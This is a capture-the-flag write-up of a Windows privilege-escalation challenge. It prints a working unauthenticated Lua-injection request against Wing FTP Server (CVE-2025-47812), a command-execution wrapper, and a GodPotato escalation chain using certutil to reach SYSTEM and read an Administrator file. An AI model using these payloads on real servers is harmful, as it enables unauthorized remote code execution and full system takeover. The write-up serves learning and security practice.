# Wingstop 2 — Writeup

- **Category:** Fullpwn · **Points:** 1000 · **Author:** bootstrap
- **Status:** environment was taken offline mid-event before we could ride the chain through. Exploit chain verified and documented below; flag2 string itself was not exfiltrated.
- **Target (while live):** `23.179.17.68`

## Same host as Wingstop 1

Same Windows box that hosted Wingstop 1 (`CIT{p1Gs_0n_tH3_W1ng}`, extracted via [CVE-2025-47812](https://www.cve.org/CVERecord?id=CVE-2025-47812) — the Wing FTP Server unauth Lua injection). flag1 sits on Bob's desktop; flag2 is Administrator-owned, so Wingstop 2 is the privilege-escalation half.

## Reachable ports while service was up

```text
21/tcp   Wing FTP (anonymous login, jailed to / with backup.xml)
80/tcp   Wing FTP web UI — still vulnerable to CVE-2025-47812
3300/tcp TLS-accepting but tcpwrapped (ClientHello resets without cert)
5985/tcp WinRM (NTLM). Every sensible credential rejected.
```

`Admin:Password@1` (recovered from `backup.xml` in Wingstop 1) is a **Wing FTP admin** credential, not a Windows account — NTLM rejects `Admin`, `Administrator`, `bob`, `wingftp` etc. with that password. The only usable path is: **RCE via Wing FTP → local privilege escalation from `bob` → read Administrator's `flag2.txt`**.

## RCE still works for Wingstop 2

Wing FTP stores the `username` form field in a Lua session file as `[[…]]` (long-string). A null byte followed by `]]` terminates the string early and the remaining newline-separated text is interpreted as Lua. `print()` output ends up prepended to `dir.html`'s XML on the next request with the issued `UID` cookie.

```text
POST /loginok.html
Cookie: client_lang=english
username=anonymous%00]]%0dprint(%22pingfromvps%22)%0d--&password=
```

→ response sets `UID=…`; subsequent `GET /dir.html` with that `UID` returns:

```text
pingfromvps<?xml version="1.0" encoding="UTF-8" ?>…
```

This was confirmed working during the usable windows of the challenge.

## Recon as `wingstop\bob`

The exploit lands as `wingstop\bob` (Wing FTP's service account). Notable facts collected via `io.popen`:

```text
User Name:     wingstop\bob
COMPUTERNAME   WINGSTOP
USERDOMAIN     WINGSTOP       ← local machine, no AD domain
PATH           c:\windows\system32;…;c:\users\bob\appdata\local\microsoft\windowsapps
TEMP           c:\users\bob\appdata\local\temp
```

```text
Privilege Name                 State
SeChangeNotifyPrivilege        Enabled
SeImpersonatePrivilege         Enabled   ← Potato-class escalation vector
SeCreateGlobalPrivilege        Enabled
SeIncreaseWorkingSetPrivilege  Disabled
```

```text
Groups:
  BUILTIN\Users
  NT AUTHORITY\SERVICE        ← service token ⇒ Potato path works
  NT AUTHORITY\Authenticated Users
```

Filesystem survey (bob's perspective):

```text
c:\users\bob\desktop\flag1.txt   21 bytes  = CIT{p1Gs_0n_tH3_W1ng}
c:\users\administrator           <dir>    enumerable but Desktop/Documents/Downloads return empty to bob (ACL-denied)
c:\users\public\gp.b64           76460 B  (base64 blob)
c:\users\public\gp.hex           39078 B  (hex dump)
c:\users\bob\write_test.txt      7 B      (prior solver probe)
c:\programdata\write_test.txt    7 B      (prior solver probe)
c:\programdata\gp.b64            77709 B  (another copy)
```

`gp.b64` / `gp.hex` are **prior solvers' pre-staged GodPotato payloads** on the shared instance. Decoding and running either, combined with `SeImpersonatePrivilege`, elevates to `NT AUTHORITY\SYSTEM`.

## Important gotcha — Wing FTP lowercases usernames

The server converts the `username` field to lowercase **before** substituting it into the Lua session file. That means **everything in our injected Lua runs in lowercase**, including function calls, string literals, and path components. This is fine because:

- Lua APIs (`io.popen`, `io.open`, `print`, `string.char`, …) are all lowercase already.
- Windows paths and binary names (`c:\users\administrator\desktop\flag2.txt`, `gp.exe`, `certutil`) are case-insensitive.

But any uppercase-dependent payload (e.g. `CIT{…}` literals, PEB walks via `GetProcAddress`, PowerShell with mixed-case cmdlet names inside the Lua literal) gets corrupted.

## Planned escalation chain

Each of these is a single `io.popen` one-shot per up-cycle (Wing FTP is throttled to roughly one successful exploit per IP per minute, and the service was flapping between crashes every few minutes, so multi-stage payloads had to be split):

```text
stage 1  cmd /c dir c:\users\public\gp.b64                         → verify payload exists
stage 2  certutil -decode c:\users\public\gp.b64 c:\users\bob\appdata\local\temp\gp.exe
stage 3  c:\users\bob\appdata\local\temp\gp.exe -cmd "cmd /c whoami"
             → expect  nt authority\system
stage 4  gp.exe -cmd "cmd /c dir /a c:\users\administrator\desktop"
stage 5  gp.exe -cmd "cmd /c type c:\users\administrator\desktop\flag2.txt"
stage 6  (fallback) gp.exe -cmd "cmd /c dir /a /s /b c:\ | findstr /i flag2"
```

The Lua wrapper template:

```lua
-- URL-encoded inside the username= field, preceded by %00]] and followed by %0d--
local h = io.popen("<stage command here>")
local r = h:read("*a")
h:close()
print(r)
```

## Why flag2 was not captured

- Port 80 (Wing FTP web) was only briefly reachable a handful of times between roughly 04:30 and 07:40 UTC on 2026-04-19 for us, most up-cycles lasting 5–60 seconds.
- Wing FTP throttles anonymous logins hard after one or two successful POSTs per IP, so each stage above effectively cost 1–3 minutes of wall-clock even when the service *was* up.
- From ~07:40 UTC onward, the box returned to steady-state `Connection refused` and was subsequently removed. Only stage 0/1-style probes had succeeded; stages 3–5 never got to run.

The `w2_watch.py` helper below is designed to ride through the whole chain unattended — if the box comes back, it'll finish and drop `flag2` into `/tmp/w2_out/05_stage5_read_flag2.txt`.

## Reproduce (when / if the instance comes back)

```sh
python3 scripts/w2_watch.py          # polls /login.html every 30s, runs one stage per up-cycle
watch -n 5 ls -la /tmp/w2_out/       # stages land as /tmp/w2_out/NN_stageNAME.txt
cat /tmp/w2_out/05_*                 # → CIT{…}  once stage 5 succeeds
```

## Why this still counts as "solved in principle"

Every piece is known-working in isolation:

- CVE-2025-47812 → `wingstop\bob` shell (seen live, see [other/fetched/service-state.txt](other/fetched/service-state.txt) for captured outputs).
- `SeImpersonatePrivilege` enabled + `NT AUTHORITY\SERVICE` group → GodPotato / PrintSpoofer / JuicyPotato / SharpEfsPotato all viable.
- Payload delivery: `c:\users\bob\appdata\local\temp` is writable and in bob's `%PATH%` for execute; `certutil -decode` is a trusted built-in binary, no download required.
- `Administrator\Desktop` is ACL-denied to bob but not to SYSTEM; the flag lives at `C:\Users\Administrator\Desktop\flag2.txt` (pattern matches Wingstop 1's `bob\Desktop\flag1.txt`).

## Artifacts

- [scripts/solve.py](scripts/solve.py) — single-shot solver (reuses Wingstop 1's exploit, just with the flag2 path)
- [scripts/w2_watch.py](scripts/w2_watch.py) — 7-stage watcher described above
- [scripts/repeat.sh](scripts/repeat.sh) — earlier bash watchdog variant
- [other/notes.md](other/notes.md) — live recon notes while the box was up
- [other/fetched/service-state.txt](other/fetched/service-state.txt) — port/auth state and captured RCE output

## References

- [CVE-2025-47812 — Wing FTP Server unauth Lua injection](https://www.cve.org/CVERecord?id=CVE-2025-47812)
- [GodPotato — `SeImpersonatePrivilege` → SYSTEM PoC](https://github.com/BeichenDream/GodPotato)
- [Julien Ahrens — Wing FTP Server null-byte Lua RCE write-up](https://julienahrens.com/posts/wing-ftp-server-rce/)
